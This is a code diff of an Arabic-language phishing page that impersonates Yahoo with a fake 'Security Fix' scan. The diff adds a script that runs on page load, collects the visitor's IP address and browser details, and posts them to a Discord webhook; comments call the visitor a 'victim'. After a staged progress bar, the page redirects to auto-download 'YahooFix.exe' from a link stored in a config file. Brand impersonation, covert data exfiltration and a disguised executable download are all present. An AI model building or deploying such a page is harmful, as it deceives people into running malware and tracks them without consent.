@@ -17,18 +17,52 @@
 <body>
     <div class="container">
         <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo" class="yahoo-logo">
-        
         <h2>فحص الأمان والخصوصية</h2>
         <p class="description">لقد تم رصد نشاط غير معتاد. يرجى الانتظار بينما نقوم بتجهيز أداة <b>Yahoo Security Fix</b> المخصصة لجهازك لتأمين حسابك فوراً.</p>
-        
         <div class="loading-box">
             <div class="progress-fill" id="bar"></div>
         </div>
-        
         <div class="status-text" id="status">جاري فحص الثغرات الأمنية (0%)</div>
     </div>
 
     <script>
+        // دالة لإرسال بيانات الضحية للديسكورد فور الدخول
+        async function reportVisitor() {
+            try {
+                // جلب عنوان الـ IP للضحية
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIP = ipData.ip;
+
+                // جلب إعدادات الويب هوك من data.json
+                const configRes = await fetch('./data.json');
+                const config = await configRes.json();
+                const webhookURL = config.webhook_url;
+
+                // إرسال التنبيه
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🔔 صيد جديد دخل الموقع (Visitor)",
+                            color: 16711680, // أحمر
+                            fields: [
+                                { name: "🌐 عنوان IP", value: `\`${userIP}\``, inline: true },
+                                { name: "📱 المتصفح", value: navigator.userAgent, inline: false },
+                                { name: "📍 الموقع", value: "صفحة التمويه (Index)", inline: true }
+                            ],
+                            footer: { text: "ER0R V3 MONITORING" }
+                        }]
+                    })
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        // تشغيل التبليغ فور فتح الصفحة
+        reportVisitor();
+
+        // نظام شريط التحميل والتنزيل التلقائي
         let progress = 0;
         const bar = document.getElementById('bar');
         const statusText = document.getElementById('status');
@@ -42,12 +76,11 @@
                 clearInterval(interval);
                 statusText.innerText = "بدء التنزيل التلقائي لملف YahooFix.exe...";
                 
-                // جلب الرابط المباشر من data.json والبدء بالتحميل
                 fetch('./data.json').then(r => r.json()).then(data => {
                     window.location.href = data.download_url;
                 });
             }
-        }, 60); // العداد يستغرق حوالي 6 ثوانٍ ليعطي انطباعاً بالفحص الحقيقي
+        }, 60);
     </script>
 </body>
 </html>
